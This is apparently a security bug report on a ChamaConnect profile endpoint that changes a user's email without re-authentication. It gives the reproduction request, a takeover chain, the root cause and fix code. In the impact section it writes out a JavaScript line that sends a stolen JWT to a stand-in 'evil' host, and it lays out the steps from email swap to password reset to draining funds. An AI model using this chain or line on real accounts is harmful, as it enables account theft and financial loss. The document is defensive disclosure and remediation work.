<p align="center">
  <img src="https://chamaconnect.io/images/chamaconnect.svg" alt="ChamaConnect" />
</p>

# BUG-063 — Email/name change without re-authentication or re-verification (one-shot account takeover)

| Field | Value |
|---|---|
| Severity | **Critical** |
| Surface | Auth / Profile API |
| Status | Open · Reproduced twice on live site 2026-04-20 |
| Discovered | 2026-04-20 |
| Discovered by | Playwright audit probe 15 + a follow-up restore run |
| CWE | CWE-620 (Unverified Password Change), CWE-640 (Weak Forgot-Password Mechanism) |

## Evidence

A plain `PATCH` to `/api/proxy/users/update-profile`, authenticated only with the signed-in user's Bearer token and **no password re-entry, no email-verification token, no OTP**, changes the authenticated account's email address *and* name:

```http
PATCH /api/proxy/users/update-profile HTTP/1.1
Host: chamaconnect.io
Authorization: Bearer eyJ...   # normal login JWT
Content-Type: application/json

{
  "email": "pwned-1776684552774@probe.local",
  "firstName": "Hack",
  "lastName":  "Hack"
}

HTTP/1.1 200 OK
{
  "message": "Successfully  updated your profile",
  "status":  "success",
  "data": {
    "id":           "69ca9583185c4debc8e94dc5",
    "email":        "pwned-1776684552774@probe.local",
    "firstName":    "Hack",
    "lastName":     "Hack",
    "phone":        "+254746152008",
    "emailVerified":true,   ← still marked verified after change!
    "accountStatus":"ACTIVE",
    ...
  }
}
```

Raw captures:
- `recon/artifacts/audit-2026-04-20T11-27-52-385Z/15_email_change.json` (first demonstration)
- `recon/tests/restore-profile.spec.ts` (second demonstration — patched **back** to the legitimate email, also with zero verification)

Both runs confirm:
- No secondary authentication factor is required (the request succeeded with only the steady-state Bearer token).
- The response retains `emailVerified: true` for the **new** email even though the new email was never verified.
- Other endpoints (`/users/current-user`, `/users/update-email`, `/users/change-email`, `/users/profile`, `/users/me`) return 404 or 405 — so `update-profile` is the single mutation point and it has none of the standard guards.

## User impact

This is a **one-shot permanent account takeover primitive** for any attacker who obtains a user's JWT for a single moment. Combined with the adjacent, already-filed bugs it is trivially weaponisable:

1. **Get the JWT** — any of:
   - BUG-013 (JWT returned in signin response body — readable by any JS on page, e.g. via XSS)
   - BUG-050 (stored XSS in group name)
   - BUG-011 (WebSocket hardcoded to `ws://localhost:3080` in production — mixed-content / MITM path)
   - Phishing the user into running `fetch('/api/proxy/users/signin', ...).then(r => r.json()).then(r => img.src = "https://evil/?t=" + r.data.token)` on a page.
2. **Change the email** — one PATCH to the victim's account with `email: attacker@evil.com`.
3. **Request password reset** — `POST /api/proxy/users/request-password-reset` goes to the new attacker-controlled address.
4. **Collect the reset link / OTP** — attacker sets a new password for the victim's account.
5. **Account is now the attacker's** — revoking the original user's access is only possible by MUIAA staff via direct DB edits.

Because BUG-016 says the JWT has no `exp`, and BUG-046 says logout does not invalidate the server-side token, step 1 can use a token that was leaked weeks or months ago.

On a chama platform this means **the attacker can be added as Chairperson** (BUG-053), **initiate B2C payouts via the "collection point" config they own** (BUG-027, BUG-028), and **drain the chama's paybill**. End-to-end, this is the chama-side analogue of the classic "bank account takeover via email change" scam.

Additional harm vectors from the same endpoint:
- **Impersonation of other members** — change your own `firstName`/`lastName` to match another member's, then intercept approvals that rely on display names (which screenshots show the UI does, e.g. the dashboard widgets).
- **Phone-number hijack** — the same endpoint almost certainly accepts a `phone` field with identical validation; swapping to an attacker's phone hijacks OTP-reset paths too. (Not tested to avoid sending SMS to a random real Safaricom subscriber.)

## Root cause

Standard "update profile" controller with mass-assignment of any field present in the request body, wrapped only by the generic `requireAuth` middleware. No:

- Password re-entry gate on sensitive fields (email, phone, name).
- Tokenized email-change flow (send a verification email to the **new** address, flip `pendingEmail` → `email` only after that link is clicked).
- `emailVerified` being reset to `false` when `email` changes.
- Rate limit per-account.
- Audit-log entry flagged as high-risk.

## Proposed fix

1. **Gate email/phone/name mutations on recent authentication.** Require the current password in the body, and/or require the request to be made within N minutes of a successful `signin`:

   ```ts
   // middleware/requireRecentAuth.ts
   export function requireRecentAuth(maxAgeMs = 5 * 60_000) {
     return (req, res, next) => {
       const iat = req.user.iat * 1000;
       if (Date.now() - iat > maxAgeMs) {
         return res.status(401).json({
           status: "error",
           message: "Please re-enter your password to continue",
           code:    "REAUTH_REQUIRED",
         });
       }
       next();
     };
   }
   ```

2. **Separate flow for email change.** Never mutate `user.email` directly. Instead:

   ```ts
   POST /api/proxy/users/request-email-change  { newEmail, password }
   → sends a one-time token to newEmail (TTL 15m)
   GET  /api/proxy/users/confirm-email-change?token=...
   → verifies token, sets user.email = newEmail, emailVerified = true,
     invalidates all existing sessions, emails the OLD address with an "undo" link.
   ```

3. **Reset `emailVerified` to `false` whenever `email` changes.** This is a hard invariant that must hold regardless of the flow.

4. **Whitelist, not blacklist, on PATCH body.** Only accept `firstName`, `lastName`, `profilePicture`. Reject `email`, `phone`, `role`, `roleId`, `isActive`, `isSuperadmin`, `emailVerified`, `accountStatus`, `blockchainAddress`, `userType` at the API layer with 400.

5. **Audit-log every profile change** with `actorId`, `subjectId`, `changedFields`, `ip`, `userAgent`, and **email the user's old address** whenever the email or phone is changed, with a one-click "this wasn't me" link that rolls back and invalidates all sessions (standard practice since 2014 — Google/GitHub/Facebook all do this).

6. **Invalidate all other sessions** when email or phone changes — requires BUG-046's revocation list.

## Verification

- `curl -X PATCH /api/proxy/users/update-profile -H 'Authorization: Bearer <old-token>' -d '{"email":"x@y"}'` → 401 `REAUTH_REQUIRED`.
- With recent auth + wrong password → 401.
- With recent auth + correct password → 200 but `emailVerified: false` and user receives a "confirm email change" link on the new address.
- Old sessions immediately get 401 on any API call.
- Old email receives a "your email was changed" alert with an undo link.
